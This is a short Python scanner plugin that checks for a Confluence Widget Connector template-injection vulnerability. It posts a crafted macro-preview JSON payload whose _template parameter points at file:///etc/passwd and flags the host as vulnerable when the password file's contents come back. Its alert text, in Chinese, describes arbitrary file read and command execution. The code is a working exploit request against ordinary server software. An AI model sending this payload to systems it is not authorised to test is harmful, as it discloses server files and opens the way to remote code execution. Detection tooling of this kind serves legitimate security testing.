#!/usr/bin/env python
# -*- coding: utf-8 -*-

from lib.poc.dummy import *


async def verify(ip, port, base_url, data):
    url = base_url + "/rest/tinymce/1/macro/preview"
    headers = {
        "Referer": base_url + "/pages/resumedraft.action?draftId=&draftShareId=",
        "Content-Type": "application/json; charset=utf-8"
    }
    try:
        r = await http_client(ip, port).post(url, data=data, headers=headers, timeout=10)
        if 'root:x:' in r.text:
            return True
    except Exception as e:
        pass


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    try:
        url = '{}://{}:{}'.format(service, ip, port)
        data = '{"contentId":"786457","macro":{"name":"widget","body":"",' \
               '"params":{"url":"https://www.viddler.com/v/23464dc5",' \
               '"width":"1000","height":"1000","_template":"%s"}}}' % "file:///etc/passwd"

        if await verify(ip, port, url, data):
            ret = {
                'alert_group': 'Confluence RCE',
                'affects': url,
                'details': u'confluence版本过低，存在漏洞可读取机器上任意文件与执行任意命令，'
                           u'举例来说，发送下面的请求至URL，可读取/etc/paswwd \n{data}\n '
                           u'to /rest/tinymce/1/macro/preview'.format(data=data)
            }
            return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 443, 'https', True, task_msg={})
    run_plugin_test(scan)
